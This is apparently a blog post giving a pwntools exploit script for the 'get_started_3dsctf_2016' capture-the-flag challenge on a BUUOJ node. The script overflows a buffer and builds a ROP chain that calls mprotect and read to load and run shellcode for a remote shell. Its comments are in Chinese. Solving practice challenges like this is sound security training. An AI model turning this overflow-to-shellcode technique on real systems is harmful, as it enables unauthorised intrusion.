+++
title = "exp2"
date = "2026-03-25"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
```python
from pwn import *  
r = remote('node5.buuoj.cn',26036)  
  
elf = ELF('./get_started_3dsctf_2016')  
mprotect_addr=elf.symbols['mprotect']  #我们通过函数执行获取mprotect的地址  
read_addr=elf.symbols['read']  #获取read函数地址  
edx_ecx_ebx_ret=0x0806fc08#  三个寄存器不用非的一样  
payload=b'a'*(0x38)+p32(mprotect_addr)  
payload+=p32(edx_ecx_ebx_ret)  
payload+=p32(0x080EB000)+p32(0x1000)+p32(0x7)  #0x080EB000是4kb的整数倍  0x7就是可读可写可执行  
payload+=p32(read_addr) #ret返回到read函数  
payload+=p32(edx_ecx_ebx_ret) #read也需要三个参数，我们回收利用  
payload+=p32(0)+p32(0x080EB000)+p32(0x100) #0就是输入  
payload+=p32(0x080EB000) #shellcode已经写入0x080EB000,而且0x080EB000地址权限是最高的，我们直接通过ret回来shell  
r.sendline(payload)  
shellcode=asm(shellcraft.sh()) #生成shellcode  
r.sendline(shellcode)  
r.interactive()
```
